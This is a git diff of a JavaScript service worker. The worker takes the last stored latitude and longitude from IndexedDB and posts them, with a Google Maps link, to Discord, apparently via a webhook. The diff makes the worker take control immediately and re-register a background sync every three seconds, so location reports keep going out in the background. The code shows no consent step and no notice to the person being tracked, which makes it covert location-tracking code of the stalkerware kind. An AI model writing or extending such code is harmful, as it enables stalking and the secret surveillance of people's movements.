@@ -1,9 +1,11 @@
+// ✅ Background Sync Event Listener
 self.addEventListener("sync", function (event) {
     if (event.tag === "syncLocation") {
         event.waitUntil(fetchLocationAndSend());
     }
 });
 
+// ✅ Fetch the Last Known Location from IndexedDB & Send it to Discord
 async function fetchLocationAndSend() {
     return new Promise((resolve, reject) => {
         openDatabase().then(db => {
@@ -16,7 +18,7 @@ async function fetchLocationAndSend() {
                 const { latitude, longitude } = locationData;
 
                 const payload = {
-                    content: `📍 **Background Location Update (Every 3s):**\n🌍 **Latitude:** ${latitude}\n🗺️ **Longitude:** ${longitude}\n🔗 [Google Maps](https://www.google.com/maps/place/${latitude},${longitude})`
+                    content: `📍 **Background Location Update:**\n🌍 **Latitude:** ${latitude}\n🗺️ **Longitude:** ${longitude}\n🔗 [Google Maps](https://www.google.com/maps/place/${latitude},${longitude})`
                 };
 
                 try {
@@ -38,10 +40,10 @@ async function fetchLocationAndSend() {
     });
 }
 
-// Open IndexedDB
+// ✅ Open IndexedDB for Storing & Retrieving Last Known Location
 function openDatabase() {
     return new Promise((resolve, reject) => {
-        const request = indexedDB.open("LocationDB", 1);
+        const request = indexedDB.open("LocationDB", 2);
 
         request.onupgradeneeded = function (event) {
             const db = event.target.result;
@@ -60,7 +62,7 @@ function openDatabase() {
     });
 }
 
-// Get Last Known Location
+// ✅ Get the Last Stored Location from IndexedDB
 function getLocationFromDB(db) {
     return new Promise((resolve, reject) => {
         const transaction = db.transaction("locations", "readonly");
@@ -76,7 +78,19 @@ function getLocationFromDB(db) {
     });
 }
 
-// Request periodic background sync every 3 seconds
+// ✅ Automatically Request Background Sync Every 3 Seconds
+self.addEventListener("install", function (event) {
+    self.skipWaiting();
+});
+
+self.addEventListener("activate", function (event) {
+    event.waitUntil(self.clients.claim());
+});
+
+self.addEventListener("fetch", function (event) {
+    event.respondWith(fetch(event.request).catch(() => new Response("Offline")));
+});
+
 setInterval(() => {
     self.registration.sync.register("syncLocation").catch(console.error);
 }, 3000);
